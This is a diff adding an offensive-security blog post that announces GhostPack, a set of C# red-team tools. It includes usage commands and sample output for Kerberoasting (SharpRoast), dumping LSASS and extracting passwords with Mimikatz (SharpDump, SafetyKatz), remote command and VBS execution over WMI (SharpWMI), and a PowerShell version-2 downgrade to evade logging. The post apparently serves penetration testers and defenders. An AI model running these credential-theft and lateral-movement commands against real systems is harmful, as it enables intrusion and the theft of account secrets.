@@ -1,0 +1,312 @@
+<p><span style="font-weight: 400;">Anyone who has followed myself or my teammates at </span><a href="https://specterops.io/who-we-are/the-team"><span style="font-weight: 400;">SpecterOps</span></a><span style="font-weight: 400;"> for a while knows that we&#8217;re fairly big fans of PowerShell. I&#8217;ve been involved in offensive PowerShell for about 4 years, </span><a href="https://twitter.com/mattifestation"><span style="font-weight: 400;">@mattifestation</span></a><span style="font-weight: 400;"> was the founder of PowerSploit and various defensive projects, </span><a href="https://twitter.com/jaredcatkinson"><span style="font-weight: 400;">@jaredcatkinson</span></a><span style="font-weight: 400;"> has been writing defensive PowerShell for years, and many of my teammates (</span><a href="https://twitter.com/tifkin_"><span style="font-weight: 400;">@tifkin_</span></a><span style="font-weight: 400;">, </span><a href="http://v/"><span style="font-weight: 400;">@enigma0x3</span></a><span style="font-weight: 400;">, </span><a href="https://twitter.com/424f424f"><span style="font-weight: 400;">rvrsh3ll</span></a><span style="font-weight: 400;">, </span><a href="https://twitter.com/xorrior"><span style="font-weight: 400;">@xorrior</span></a><span style="font-weight: 400;">, </span><a href="https://twitter.com/andrewchiles"><span style="font-weight: 400;">@andrewchiles</span></a><span style="font-weight: 400;">, and others) have written various security-related PowerShell projects over the past several years, totaling thousands of lines of code.</span></p>
+<p><span style="font-weight: 400;">By now, the reason for choosing PowerShell should be fairly self-evident; the language is Turing-complete, built into modern Windows operating systems, and you can do anything with it. Our familiarity with PowerShell and its ubiquity on modern platforms led it to become our language of choice for proof of concepts and </span><a href="https://github.com/harmj0y/DAMP"><span style="font-weight: 400;">rapid prototyping</span></a><span style="font-weight: 400;">, as well as more fleshed out projects like </span><a href="https://github.com/EmpireProject/Empire"><span style="font-weight: 400;">PowerShell Empire</span></a><span style="font-weight: 400;">.</span></p>
+<p><span style="font-weight: 400;">Then, with the awesome work from the PowerShell team with PowerShell Version 5, everything changed (sort of.) The canonical &#8220;</span><a href="https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/"><span style="font-weight: 400;">PowerShell ♥ the Blue Team</span></a><span style="font-weight: 400;">&#8221; post from June of 2015 (ironically published one month before Empire was released : ) details all the amazing new security protections integrated into the PowerShell engine, from better transcription, to deep script block logging, AMSI, and more. I had a slight offensive existential crisis when their post dropped, as I felt that a death blow had just been dealt to offensive PowerShell.</span></p>
+<p><span style="font-weight: 400;">But guess what? Three years on and we still use PowerShell for many engagements, and the (offensive) sky has not fallen. For nearly every defensive step forward, the offensive community tends to respond in kind. I detailed a bit of this back-and-forth history with security-oriented PowerShell in my &#8220;</span><a href="https://www.slideshare.net/harmj0y/catch-me-if-you-can-powershell-red-vs-blue"><span style="font-weight: 400;">Catch Me If You Can: PowerShell Red vs Blue</span></a><span style="font-weight: 400;">&#8221; presentation last year at PSConfEU, and </span><a href="https://twitter.com/mattifestation"><span style="font-weight: 400;">@mattifestation</span></a><span style="font-weight: 400;"> details some in depth bypasses for PowerShell-related security controls in our </span><a href="https://specterops.io/how-we-help/training-offerings/adversary-tactics-powershell"><span style="font-weight: 400;">Adversary Tactics: PowerShell</span></a><span style="font-weight: 400;"> course offering.</span></p>
+<p><span style="font-weight: 400;">After three years, here are my main two observations on why we&#8217;ve been able to continue to use PowerShell code offensively:</span></p>
+<ul>
+<li><b>The &#8220;Version 2 problem&#8221;:</b><span style="font-weight: 400;"> sadly, many organizations that have PowerShell Version 5 deployed either do not uninstall PowerShell Version 2, or actually install version 2 for backwards compatibility reasons. Version 2 of PowerShell does not take advantage any of the awesome security protections implemented by the PowerShell team, so if we can coerce this version of the engine to load we have nothing to worry about. This can be done as easily as </span><b>powershell.exe -version 2</b><span style="font-weight: 400;">, or we can manually load up any version present when using </span><a href="https://twitter.com/tifkin_"><span style="font-weight: 400;">@tifkin_</span></a><span style="font-weight: 400;">&#8216;s </span><a href="https://github.com/leechristensen/UnmanagedPowerShell"><span style="font-weight: 400;">UnmanagedPowerShell</span></a><span style="font-weight: 400;"> project. Most places are also not searching for abnormal PowerShell hosts, i.e. the loading of system.management.automation.dll into non-powershell.exe processes.</span></li>
+<li><b>Lack of centralized logging: </b><span style="font-weight: 400;">from a scriptblock logging perspective, PowerShell is terrifying to us attackers. As Jeffrey Snover and Lee Holmes mentioned </span><a href="https://www.youtube.com/watch?v=BMreZZ1cgFI"><span style="font-weight: 400;">in their 2017 DerbyCon keynote</span></a><span style="font-weight: 400;">, &#8220;</span><i><span style="font-weight: 400;">We know you have a choice in post-exploitation languages and we&#8217;re glad you chose PowerShell.</span></i><span style="font-weight: 400;">&#8221; However, as we&#8217;ve seen, in order for this system to be effective for an environment, a) Windows 10/Server 2016 needs to be widely deployed, b) logging has to be properly enabled on the host level, c) host logs have to be forwarded to a centralized SIEM/analysis platform, d) incident responders have to be paying attention and doing proper analysis on the logs, and e) incident responders have to be able to react within a reasonable amount of time. If any of these parts break down (and they often do in large organizations), red teams and real bad guys can still be quite effective with offensive PowerShell toolkits.</span></li>
+</ul>
+<p><span style="font-weight: 400;">We&#8217;re big advocates of what Raphael Mudge termed &#8220;</span><a href="https://blog.cobaltstrike.com/2012/12/05/offense-in-depth/"><span style="font-weight: 400;">offense-in-depth</span></a><span style="font-weight: 400;">&#8220;. In short, we like to have options in case a single tool or offensive technique fails in a particular environment. We&#8217;ve said for a few years (along with many others) that pivoting to offensive C# makes the most sense when coming from a PowerShell background. While you lose the amazing PowerShell pipeline and the ability to invoke one-liner stubs that load up all code in memory, you retain all access to existing .NET libraries, gain additional weaponization vectors (think </span><a href="https://twitter.com/subtee"><span style="font-weight: 400;">@subtee</span></a><span style="font-weight: 400;">&#8216;s various app-whitelisting bypass vectors), have a number of additional obfuscation options, and avoid all PowerShell security protections. While there is a bit more overhead in learning to build a C# project instead of a simple PowerShell script, we truly do believe that PowerShell is a great &#8220;gateway drug&#8221; to C#.</span></p>
+<p><span style="font-weight: 400;">So with that bit over with, I&#8217;d like to introduce some of what we&#8217;ve been working on over the past few months.</span></p>
+<h1>GhostPack</h1>
+<p><span style="font-weight: 400;">GhostPack is (currently) a collection various C# implementations of previous PowerShell functionality, and includes six separate toolsets being released today- </span><a href="https://github.com/GhostPack/Seatbelt/"><span style="font-weight: 400;">Seatbelt</span></a><span style="font-weight: 400;">, </span><a href="https://github.com/GhostPack/SharpUp/"><span style="font-weight: 400;">SharpUp</span></a><span style="font-weight: 400;">, </span><a href="https://github.com/GhostPack/SharpRoast/"><span style="font-weight: 400;">SharpRoast</span></a><span style="font-weight: 400;">, </span><a href="https://github.com/GhostPack/SharpDump/"><span style="font-weight: 400;">SharpDump</span></a><span style="font-weight: 400;">, </span><a href="https://github.com/GhostPack/SafetyKatz/"><span style="font-weight: 400;">SafetyKatz</span></a><span style="font-weight: 400;">, and </span><a href="https://github.com/GhostPack/SharpWMI/"><span style="font-weight: 400;">SharpWMI</span></a><span style="font-weight: 400;">. All of these projects will be hosted on the </span><a href="http://github.com/GhostPack/"><span style="font-weight: 400;">GhostPack</span></a><span style="font-weight: 400;"> GitHub organization, with each project broken out as a separate repository.</span></p>
+<p><span style="font-weight: 400;">Quick sidenote: </span><i><span style="font-weight: 400;">GhostPack is not intended to be only C# code, nor is it purely offensive</span></i><span style="font-weight: 400;">, though the projects released today are all C#. The plan is to have the organization house a number of security-related projects that are not PowerShell. Additionally, to keep defenders from building brittle signatures (think flagging various author&#8217;s Twitter handles : ) we&#8217;re not currently planning to distribute binaries for any of the projects. However, everything is Visual Studio Community 2015 compatible, so it&#8217;s a snap to build yourself.</span></p>
+<p><span style="font-weight: 400;">Full disclosure: </span><b>that&#8217;s almost nothing &#8220;new&#8221; here</b><span style="font-weight: 400;">, just different implementations of the same techniques many have been using for years. Also, all code here should be considered beta- it&#8217;s had some testing but there are still plenty of bugs to be had :)</span></p>
+<h2>Seatbelt</h2>
+<p><span style="font-weight: 400;"><a href="https://github.com/GhostPack/Seatbelt/">Seatbelt</a> is by far the meatiest project being released. It&#8217;s a clearinghouse of situational awareness &#8220;safety checks&#8221;. That is, it manages the collection of host data that may be interesting from both offensive and defensive perspectives. Think everything from PowerShell security settings, to current user Kerberos tickets, to deleted Recycle Bin items, and more (40+ current checks!)</span></p>
+<p><span style="font-weight: 400;">Seatbelt draws on a TON of existing work, highlighted in the </span><a href="https://github.com/GhostPack/Seatbelt/blob/master/README.md"><span style="font-weight: 400;">README.md</span></a><span style="font-weight: 400;">, and has already proven itself to be pretty useful on our engagements. It was heavily influenced by </span><a href="https://twitter.com/tifkin_"><span style="font-weight: 400;">@tifkin_</span></a><span style="font-weight: 400;">&#8216;s </span><a href="https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-HostProfile.ps1"><span style="font-weight: 400;">Get-HostProfile.ps1</span></a><span style="font-weight: 400;"> and </span><a href="https://twitter.com/andrewchiles"><span style="font-weight: 400;">@andrewchiles</span></a><span style="font-weight: 400;">&#8216; </span><a href="https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1"><span style="font-weight: 400;">HostEnum.ps1</span></a><span style="font-weight: 400;"> PowerShell scripts.</span></p>
+<p><strong>SeatBelt.exe system </strong>collects the following system data:</p>
+<ul>
+<li><strong>BasicOSInfo</strong> &#8211; Basic OS info (i.e. architecture, OS version, etc.)</li>
+<li><strong>RebootSchedule</strong> &#8211; Reboot schedule (last 15 days) based on event IDs 12 and 13</li>
+<li><strong>TokenGroupPrivs</strong> &#8211; Current process/token privileges (e.g. SeDebugPrivilege/etc.)</li>
+<li><strong>UACSystemPolicies</strong> &#8211; UAC system policies via the registry</li>
+<li><strong>PowerShellSettings</strong> &#8211; PowerShell versions and security settings via the registry</li>
+<li><strong>AuditSettings</strong> &#8211; Audit settings via the registry</li>
+<li><strong>WEFSettings</strong> &#8211; Windows Event Forwarding (WEF) settings via the registry</li>
+<li><strong>LSASettings</strong> &#8211; LSA settings (including auth packages)</li>
+<li><strong>UserEnvVariables</strong> &#8211; Current user environment variables</li>
+<li><strong>SystemEnvVariables</strong> &#8211; Current system environment variables</li>
+<li><strong>UserFolders</strong> &#8211; Folders in C:\Users\</li>
+<li><strong>NonstandardServices</strong> &#8211; Services with binary paths not in C:\Windows\</li>
+<li><strong>InternetSettings</strong> &#8211; Internet settings, including proxy configs</li>
+<li><strong>LapsSettings</strong> &#8211; LAPS settings, if installed</li>
+<li><strong>LocalGroupMembers</strong> &#8211; Members of local admins, RDP, and remote DCOM groups</li>
+<li><strong>MappedDrives</strong> &#8211; Currently mapped drives</li>
+<li><strong>RDPSessions</strong> &#8211; Current incoming RDP sessions</li>
+<li><strong>WMIMappedDrives</strong> &#8211; Mapped drives via WMI</li>
+<li><strong>NetworkShares</strong> &#8211; Network shares</li>
+<li><strong>FirewallRules</strong> &#8211; Deny firewall rules, &#8220;full&#8221; dumps all</li>
+<li><strong>AntiVirusWMI</strong> &#8211; Registered antivirus (via WMI)</li>
+<li><strong>InterestingProcesses</strong> &#8211; &#8220;Interesting&#8221; processes- defensive products and admin tools</li>
+<li><strong>RegistryAutoLogon</strong> &#8211; Registry autologon information</li>
+<li><strong>RegistryAutoRuns</strong> &#8211; Registry autoruns</li>
+<li><strong>DNSCache</strong> &#8211; DNS cache entries (via WMI)</li>
+<li><strong>ARPTable</strong> &#8211; Lists the current ARP table and adapter information (equivalent to arp -a)</li>
+<li><strong>AllTcpConnections</strong> &#8211; Lists current TCP connections and associated processes</li>
+<li><strong>AllUdpConnections</strong> &#8211; Lists current UDP connections and associated processes</li>
+<li><strong>NonstandardProcesses</strong> &#8211; Processes with binary paths not in C:\Windows\</li>
+</ul>
+<p>If the user is in high integrity the following additional actions are run:</p>
+<ul>
+<li><strong>SysmonConfig</strong> &#8211; Sysmon configuration from the registry</li>
+</ul>
+<p><strong>SeatBelt.exe user</strong> collects the following user data:</p>
+<ul>
+<li>Checks if Firefox has history files</li>
+<li>Checks if Chrome has history files</li>
+<li><strong>TriageIE</strong> &#8211; Internet Explorer bookmarks and history, last 7 days</li>
+<li><strong>SavedRDPConnections</strong> &#8211; Saved RDP connections, including username hints</li>
+<li><strong>RecentRunCommands</strong> &#8211; Recent &#8220;run&#8221; commands</li>
+<li><strong>PuttySessions</strong> &#8211; Interesting settings from any saved Putty configurations</li>
+<li><strong>PuttySSHHostKeys</strong> &#8211; Saved putty SSH host keys</li>
+<li><strong>RecentFiles</strong> &#8211; Parsed &#8220;recent files&#8221; shortcuts, last 7 days</li>
+</ul>
+<p>If the user is in high integrity, these checks are run for ALL users instead of just the current user.</p>
+<p>Miscellaneous checks:</p>
+<ul>
+<li><strong>CurrentDomainGroups</strong> &#8211; The current user&#8217;s local and domain groups</li>
+<li><strong>Patches</strong> &#8211; Installed patches via WMI (takes a bit on some systems)</li>
+<li><strong>LogonSessions</strong> &#8211; User logon session data</li>
+<li><strong>KerberosTGTData</strong> &#8211; ALL TEH TGTZ!</li>
+<li><strong>InterestingFiles</strong> &#8211; &#8220;Interesting&#8221; files matching various patterns in the user&#8217;s folder</li>
+<li><strong>IETabs</strong> &#8211; Open Internet Explorer tabs</li>
+<li><strong>TriageChrome</strong> &#8211; Chrome bookmarks and history</li>
+<li><strong>TriageFirefox</strong> &#8211; Firefox history (no bookmarks)</li>
+<li><strong>RecycleBin</strong> &#8211; Items in the Recycle Bin deleted in the last 30 days &#8211; only works from a user context!</li>
+<li><strong>KerberosTickets</strong> &#8211; List Kerberos tickets. If elevated, list all grouped by all logon sessions.</li>
+<li><strong>4624Events</strong> &#8211; 4624 logon events from the security event log</li>
+<li><strong>4648Events</strong> &#8211; 4648 explicit logon events from the security event log</li>
+</ul>
+<p><strong>SeatBelt.exe all</strong> will run ALL enumeration checks, can be combined with <strong>full</strong>.</p>
+<p><strong>SeatBelt.exe [CheckName] [CheckName2] &#8230;</strong> will run one or more specified checks only (case-sensitive naming!)</p>
+<p><strong>SeatBelt.exe [system/user/all/CheckName] full</strong> will prevent any filtering and will return complete results. By default, certain checks are filtered (e.g. services NOT in C:\Windows\, etc.)</p>
+<p>Here&#8217;s an example of some of the system collection:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-4579" src="http://www.harmj0y.net/blog/wp-content/uploads/2018/07/seatbelt_system_output-1024x653.png" alt="" width="1024" height="653" srcset="https://blog.harmj0y.net/wp-content/uploads/2018/07/seatbelt_system_output-1024x653.png 1024w, https://blog.harmj0y.net/wp-content/uploads/2018/07/seatbelt_system_output-300x191.png 300w, https://blog.harmj0y.net/wp-content/uploads/2018/07/seatbelt_system_output-768x490.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p><span style="font-weight: 400;">There are a TON of checks and interesting information to gather- I definitely recommend you play around with it to see what works for you!</span></p>
+<h2>SharpUp</h2>
+<p><span style="font-weight: 400;"><a href="https://github.com/GhostPack/SharpUp/">SharpUp</a> is the start of a C# port of </span><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1"><span style="font-weight: 400;">PowerUp</span></a><span style="font-weight: 400;">&#8216;s privilege escalation checks. Currently, only the most common checks have been ported; no weaponization functions have yet been implemented. The currently implemented checks are:</span></p>
+<ul>
+<li><strong>GetModifiableServices</strong> &#8211; Returns services the current user can modify</li>
+<li><strong>GetModifiableServiceBinaries</strong> &#8211; Returns services with binaries that the current user can modify</li>
+<li><strong>GetAlwaysInstallElevated</strong> &#8211; Returns any values for the AlwaysInstallElevated registry key</li>
+<li><strong>GetPathHijacks</strong> &#8211; Returns any folder in %PATH% that the current user can modify</li>
+<li><strong>GetModifiableRegistryAutoRuns</strong> &#8211; Returns any modifiable binaries/scripts set to run in HKLM auto-runs</li>
+<li><strong>GetSpecialTokenGroupPrivs</strong> &#8211; Returns &#8220;special&#8221; user privileges (e.g. SeDebugPrivilege/etc.)</li>
+<li><strong>GetUnattendedInstallFiles</strong> &#8211; Returns any left over unattended install files</li>
+<li><strong>GetMcAfeeSitelistFiles</strong> &#8211; Returns any McAfee SiteList.xml file locations</li>
+</ul>
+<p>Here&#8217;s an example of its output:</p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpUp.exe
+
+=== SharpUp: Running Privilege Escalation Checks ===
+
+
+
+=== Modifiable Services ===
+
+Name             : VulnSvc
+DisplayName      : VulnSvc
+Description      :
+State            : Stopped
+StartMode        : Auto
+PathName         : C:\Program Files\VulnSvc\VulnSvc.exe
+
+
+=== Modifiable Service Binaries ===
+
+Name             : VulnSvc2
+DisplayName      : VulnSvc22
+Description      :
+State            : Stopped
+StartMode        : Auto
+PathName         : C:\VulnSvc2\VulnSvc2.exe
+
+
+=== AlwaysInstallElevated Registry Keys ===
+
+
+
+=== Modifiable Folders in %PATH% ===
+
+Modifable %PATH% Folder  : C:\Go\bin
+
+
+=== Modifiable Registry Autoruns ===
+
+
+
+=== *Special* User Privileges ===
+
+
+
+=== Unattended Install Files ===
+
+
+
+=== McAfee Sitelist.xml Files ===
+
+
+
+[*] Completed Privesc Checks in 18 seconds</pre>
+<h2>SharpRoast</h2>
+<p class="p1"><span style="font-weight: 400;"><a href="https://github.com/GhostPack/SharpRoast/">SharpRoast</a> is a C# port of various </span><a href="https://github.com/PowerShellMafia/PowerSploit/blob/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1#L2574-L2774"><span style="font-weight: 400;">PowerView&#8217;s Kerberoasting functionality</span></a><span style="font-weight: 400;">. The </span><a href="https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx"><span style="font-weight: 400;">KerberosRequestorSecurityToken.GetRequest Method()</span></a> <span style="font-weight: 400;">method used was contributed to PowerView by </span><a href="https://twitter.com/machosec"><span style="font-weight: 400;">@machosec</span></a><span style="font-weight: 400;">. The hashes are output in </span><a href="https://hashcat.net/hashcat/"><span style="font-weight: 400;">hashcat</span></a><span style="font-weight: 400;"> format.</span></p>
+<p><span style="font-weight: 400;">For more information on Kerberoasting, including links to Tim Medin&#8217;s original talk on the subject, check out my &#8220;</span><a href="https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/"><span style="font-weight: 400;">Kerberoasting Without Mimikatz</span></a><span style="font-weight: 400;">&#8221; post from November, 2016.</span></p>
+<p>To r<span style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;">oast all users in the current domain:</span></p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpRoast.exe all
+SamAccountName         : harmj0y
+DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
+ServicePrincipalName   : asdf/asdfasdf
+Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...
+
+SamAccountName         : sqlservice
+DistinguishedName      : CN=SQL,CN=Users,DC=testlab,DC=local
+ServicePrincipalName   : MSSQLSvc/SQL.testlab.local
+Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc/SQL.testlab.local*$9994D1...
+
+...</pre>
+<p>To r<span style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;">oast a specific SPN in the current domain:</span></p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpRoast.exe "asdf/asdfasdf"
+Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...</pre>
+<div>
+<div>
+<p>To r<span style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;">oast a specific user in the current domain:</span></p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpRoast.exe harmj0y
+SamAccountName         : harmj0y
+DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
+ServicePrincipalName   : asdf/asdfasdf
+Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...</pre>
+</div>
+<div>To roast users from a specified OU in the current domain:</div>
+<div>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpRoast.exe "OU=TestingOU,DC=testlab,DC=local"
+SamAccountName         : testuser2
+DistinguishedName      : CN=testuser2,OU=TestingOU,DC=testlab,DC=local
+ServicePrincipalName   : service/host
+Hash                   : $krb5tgs$23$*$testlab.local$service/host*$08A6462...</pre>
+<div>
+<div>To roast a specific specific SPN in another (trusted) domain:</div>
+</div>
+</div>
+</div>
+<pre class="lang:default decode:true">C:\Temp\&gt;SharpRoast.exe "MSSQLSvc/SQL@dev.testlab.local"
+Hash                   : $krb5tgs$23$*user$DOMAIN$MSSQLSvc/SQL@dev.testlab.local*$9994D148...</pre>
+<p>To r<span style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;">oast all users in another (trusted) domain:</span></p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpRoast.exe "LDAP://DC=dev,DC=testlab,DC=local"
+SamAccountName         : jason
+DistinguishedName      : CN=jason,CN=Users,DC=dev,DC=testlab,DC=local
+ServicePrincipalName   : test/test
+Hash                   : $krb5tgs$23$*$dev.testlab.local$test/test*$9129566
+
+...</pre>
+<p>Any of these commands also accept a [domain.com\user] [password] for to roast with explicit credentials. For example:</p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpRoast.exe harmj0y "testlab.local\dfm" "Password123!"
+SamAccountName         : harmj0y
+DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
+ServicePrincipalName   : asdf/asdfasdf
+Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...
+</pre>
+<p>This can be useful if you&#8217;re encountering a double-hop type of situation.</p>
+<h2>SharpDump</h2>
+<p><span style="font-weight: 400;"><a href="https://github.com/GhostPack/SharpDump/">SharpDump</a> is a essentially C# port of various </span><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1"><span style="font-weight: 400;">PowerSploit&#8217;s Out-Minidump.ps1</span></a><span style="font-weight: 400;"> functionality. The </span><a href="https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump"><span style="font-weight: 400;">MiniDumpWriteDump</span></a><span style="font-weight: 400;"> Win32 API call is used to create a mini-dump for the process ID specified (LSASS by default) to C:\Windows\Temp\debug&lt;PID&gt;.out, GZipStream is used to compress the dump to C:\Windows\Temp\debug&lt;PID&gt;.bin (.gz format), and the original minidump file is deleted.</span></p>
+<p>To dump LSASS (the default):</p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpDump.exe
+
+[*] Dumping lsass (808) to C:\WINDOWS\Temp\debug808.out
+[+] Dump successful!
+
+[*] Compressing C:\WINDOWS\Temp\debug808.out to C:\WINDOWS\Temp\debug808.bin gzip file
+[*] Deleting C:\WINDOWS\Temp\debug808.out
+
+[+] Dumping completed. Rename file to "debug808.gz" to decompress.
+
+[*] Operating System : Windows 10 Enterprise N
+[*] Architecture     : AMD64
+[*] Use "sekurlsa::minidump debug.out" "sekurlsa::logonPasswords full" on the same OS/arch
+</pre>
+<p>To dump a specific process ID:</p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpDump.exe 8700
+
+[*] Dumping notepad++ (8700) to C:\WINDOWS\Temp\debug8700.out
+[+] Dump successful!
+
+[*] Compressing C:\WINDOWS\Temp\debug8700.out to C:\WINDOWS\Temp\debug8700.bin gzip file
+[*] Deleting C:\WINDOWS\Temp\debug8700.out
+
+[+] Dumping completed. Rename file to "debug8700.gz" to decompress.</pre>
+<p>If dumping LSASS, this compressed minidump can then be downloaded, renamed to dump&lt;PID&gt;.gz, extracted, and run through Mimikatz&#8217; <strong>sekurlsa::minidump</strong> functionality on a similar platform:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-4575" src="http://www.harmj0y.net/blog/wp-content/uploads/2018/07/mimikatz_minidump-1024x708.png" alt="" width="1024" height="708" srcset="https://blog.harmj0y.net/wp-content/uploads/2018/07/mimikatz_minidump-1024x708.png 1024w, https://blog.harmj0y.net/wp-content/uploads/2018/07/mimikatz_minidump-300x207.png 300w, https://blog.harmj0y.net/wp-content/uploads/2018/07/mimikatz_minidump-768x531.png 768w, https://blog.harmj0y.net/wp-content/uploads/2018/07/mimikatz_minidump.png 1237w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<h2>SafetyKatz</h2>
+<p><span style="font-weight: 400;"><a href="https://github.com/GhostPack/SafetyKatz/">SafetyKatz</a> is a combination of SharpDump, </span><a href="https://twitter.com/gentilkiwi"><span style="font-weight: 400;">@gentilkiwi</span></a><span style="font-weight: 400;">&#8216;s </span><a href="https://github.com/gentilkiwi/mimikatz/"><span style="font-weight: 400;">Mimikatz project</span></a><span style="font-weight: 400;">, and </span><a href="https://twitter.com/subtee"><span style="font-weight: 400;">@subtee</span></a><span style="font-weight: 400;">&#8216;s </span><a href="https://github.com/re4lity/subTee-gits-backups/blob/master/PELoader.cs"><span style="font-weight: 400;">.NET PE loader</span></a><span style="font-weight: 400;">.</span></p>
+<p><span style="font-weight: 400;">First, the </span><a href="https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump"><span style="font-weight: 400;">MiniDumpWriteDump</span></a><span style="font-weight: 400;"> Win32 API call is used to create a mini-dump of LSASS to C:\Windows\Temp\debug.bin. Then @subtee&#8217;s PELoader is used to load a customized version of Mimikatz that runs </span><b>sekurlsa::logonpasswords </b><span style="font-weight: 400;">and </span><b>sekurlsa::ekeys</b><span style="font-weight: 400;"> on the minidump file, removing the file after execution is complete. This allows you to extract passwords from a system without having to transport the multi-megabyte minidump file, but prevents the Mimikatz&#8217; <em>specific</em> OpenProcess attach to LSASS.</span></p>
+<pre class="lang:default decode:true">C:\Temp&gt;SafetyKatz.exe
+
+[*] Dumping lsass (808) to C:\WINDOWS\Temp\debug.bin
+[+] Dump successful!
+
+[*] Executing loaded Mimikatz PE
+
+.#####.   mimikatz 2.1.1 (x64) built on Jul  7 2018 03:36:26 - lil!
+.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+## / \ ##  / *** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+'#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   *** /
+
+mimikatz # Opening : 'C:\Windows\Temp\debug.bin' file for minidump...
+
+Authentication Id : 0 ; 28935082 (00000000:01b983aa)
+Session           : Interactive from 0
+User Name         : blahuser
+Domain            : WINDOWS10
+Logon Server      : WINDOWS10
+Logon Time        : 7/15/2018 1:07:55 PM
+SID               : S-1-5-21-1473254003-2681465353-4059813368-1002
+        msv :
+        [00000003]
+Primary
+        * Username : blahuser
+        * Domain   : WINDOWS10
+
+...(snip)...
+
+mimikatz # deleting C:\Windows\Temp\debug.bin</pre>
+<h2>SharpWMI</h2>
+<p><span style="font-weight: 400;">The last small tool (<a href="https://github.com/GhostPack/SharpWMI/">SharpWMI</a>) is a simple C# wrapper for various WMI functionality. It allows for generic remote (or local) WMI querying, remote process execution through Win32_Process, and remote VBS execution through &#8220;temporarily&#8221; permanent WMI event subscriptions.</span></p>
+<pre class="lang:default decode:true">Local system enumeration  :
+    SharpWMI.exe action=query query="select * from win32_service" [namespace=BLAH]
+    Ex: SharpWMI.exe action=query query="select * from win32_process"
+    Ex: SharpWMI.exe action=query query="SELECT * FROM AntiVirusProduct" namespace="root\SecurityCenter2"
+
+Remote system enumeration :
+    SharpWMI.exe action=query computername=HOST1[,HOST2,...] query="select * from win32_service" [namespace=BLAH]
+    Ex: SharpWMI.exe action=query computername=primary.testlab.local query="select * from win32_service"
+    Ex: SharpWMI.exe action=query computername=primary,secondary query="select * from win32_process
+
+Remote process creation   :
+    SharpWMI.exe action=create computername=HOST[,HOST2,...] command="C:\temp\process.exe [args]"
+    Ex: SharpWMI.exe action=create computername=primary.testlab.local command="powershell.exe -enc ZQBj..."
+
+Remote VBS execution      :
+    SharpWMI.exe action=executevbs computername=HOST[,HOST2,...]
+    Ex: SharpWMI.exe action=executevbs computername=primary.testlab.local
+</pre>
+<p><span style="font-weight: 400;">Nothing revolutionary here, but the WMI event subscription approach has served us well. A timer-based event subscription is created on the remote system with arbitrary VBS as the ActiveScriptEventConsumer payload. The event triggers, your VBS is executed, and everything is cleaned up:</span></p>
+<pre class="lang:default decode:true ">C:\Temp&gt;SharpWMI.exe action=executevbs computername=primary.testlab.local
+
+[*] Creating 'Timer' object on primary.testlab.local
+[*] Setting 'Debug' event filter on primary.testlab.local
+[*] Setting 'Debug' event consumer on primary.testlab.local
+[*] Binding 'Debug' event filter and consumer on primary.testlab.local
+
+[*] Waiting 45 seconds for event to trigger on primary.testlab.local ...
+
+[*] Removing 'Timer' internal timer from primary.testlab.local
+[*] Removing FilterToConsumerBindingr from primary.testlab.local
+[*] Removing 'Debug' event filter from primary.testlab.local
+[*] Removing 'Debug' event consumer from primary.testlab.local</pre>
+<p><span style="font-weight: 400;">The filter/consumer name can be modified with the </span><b>eventname=BLAH </b><span style="font-weight: 400;">argument. If you want to change the VBS executed, modify the </span><b>vbsPayload </b><span style="font-weight: 400;">string at the top of the project before compiling. </span><a href="https://github.com/tyranid/DotNetToJScript"><span style="font-weight: 400;">DotNetToJScript</span></a><span style="font-weight: 400;"> works great here ;)</span></p>
+<h1>Wrapup</h1>
